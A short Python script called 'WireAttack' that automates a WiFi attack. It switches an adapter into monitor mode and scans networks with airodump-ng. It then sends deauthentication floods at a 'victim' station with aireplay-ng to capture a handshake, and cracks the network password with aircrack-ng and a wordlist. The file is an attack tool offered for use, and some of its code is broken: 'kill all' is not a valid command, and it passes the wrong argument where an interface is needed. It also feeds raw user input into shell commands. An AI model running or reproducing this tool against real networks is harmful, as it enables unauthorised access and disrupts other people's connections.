import os
import time
import pyfiglet

banner = pyfiglet.figlet_format("WireAttack")

enter = "\n"

print("""{0}
            *** The Tool Was Created By Idan Malihi ***{1}""".format(banner,enter))

print("Set up the adapter{0}".format(enter))

try:
    adapter = input("Enter your adapter's name > ")
    print("{0}Checking if there are any problematic PPID........................... (Press Enter){0}".format(enter))

    os.system("kill all")
    print("All PPID have been deleted.{0}".format(enter))
    
    print("Let's Enable Monitor Mode!{0}".format(enter))
    os.system("ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up".format(adapter))
    print("Mode Monitor in {0} has changed successfully!{1}".format(adapter, enter))

    print("Press CTRL + C When you Finish the SCAN! *IMPORTANT* ")

    time.sleep(5)

    os.system("airodump-ng {0}".format(adapter))

except:
    print("Your adapter's name does not exist, please check with 'iwconfig' command.")

bssid_name = input("Enter BSSID Name > ")
channel = input("{0}Enter channel > ".format(enter))
bssid = input("{0}Enter BSSID > ".format(enter))

os.system("airodump-ng -c {0} --bssid {1} {2} -w /root/Desktop/{2}".format(channel, bssid, bssid_name))
time.sleep(5)

print("PCAP file saved in /root/Desktop{0}".format(enter))

packets = int(input("Enter Number of Attacks (10-100) > "))
victim = input("Enter Victim's Station > ")

os.system("aireplay-ng --deauth {0} -a {1} -c {2} {3}".format(packets, bssid, victim, bssid_name))

time.sleep(5)

pcap_file_path = input("Enter PCAP File Path > ")
wordlist_path = input("{0}Enter Wordlist Path > ".format(enter))

os.system("aircrack-ng -w {0} {1}".format(wordlist_path, pcap_file_path))

print("Done")
